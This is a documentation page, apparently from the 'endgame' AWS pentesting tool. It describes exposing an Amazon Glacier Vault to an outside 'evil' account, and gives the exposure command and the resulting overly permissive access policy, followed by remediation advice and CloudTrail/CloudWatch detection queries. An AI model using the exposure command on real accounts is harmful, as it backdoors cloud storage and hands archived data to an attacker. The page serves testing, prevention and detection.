# Glacier Vault

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service glacier --name test-resource-exposure
```

* To view the contents of the Glacier Vault Access Policy, run the following:

```bash
export VICTIM_ACCOUNT_ID=111122223333

aws glacier get-vault-access-policy \
    --account-id $VICTIM_ACCOUNT_ID \
    --vault-name test-resource-exposure
```

* Observe that the output of the overly permissive Glacier Vault Access Policies resembles the example shown below.


## Example

Observe that the policy below allows the evil principal (`arn:aws:iam::999988887777:user/evil`) the `glacier:*` permissions to the Glacier Vault named `test-resource-exposure`.

```json
{
    "policy": {
        "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"glacier:*\",\"Resource\":\"arn:aws:glacier:us-east-1:111122223333:vaults/test-resource-exposure\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:user/evil\"},\"Action\":\"glacier:*\",\"Resource\":\"arn:aws:glacier:us-east-1:111122223333:vaults/test-resource-exposure\"}]}"
    }
}
```

## Exploitation

```
TODO
```

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Trusted Accounts Only**: Ensure that Glacier Vaults are only shared with trusted accounts, and that the trusted accounts truly need access to the Vaults.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Leverage Strong Resource-based Policies**: Follow the resource-based policy recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#leverage-strong-resource-based-policies)
* **Restrict access to IAM permissions that could lead to exposure of your Vaults**: Tightly control access to the following IAM actions:
      - [glacier:GetVaultAccessPolicy](https://docs.aws.amazon.com/amazonglacier/latest/dev/api-GetVaultAccessPolicy.html): _Retrieves the access-policy subresource set on the vault_
      - [glacier:ListVaults](https://docs.aws.amazon.com/amazonglacier/latest/dev/api-vaults-get.html): _Lists all vaults_
      - [glacier:SetVaultAccessPolicy](https://docs.aws.amazon.com/amazonglacier/latest/dev/api-SetVaultAccessPolicy.html): _Configures an access policy for a vault and will overwrite an existing policy._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='glacier.amazonaws.com' and eventName='SetVaultAccessPolicy'
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='glacier.amazonaws.com' and (eventName='SetVaultAccessPolicy' and requestParameters.policy.policy like 'Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [set-vault-access-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/glacier/set-vault-access-policy.html)
* [get-vault-access-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/glacier/get-vault-access-policy.html)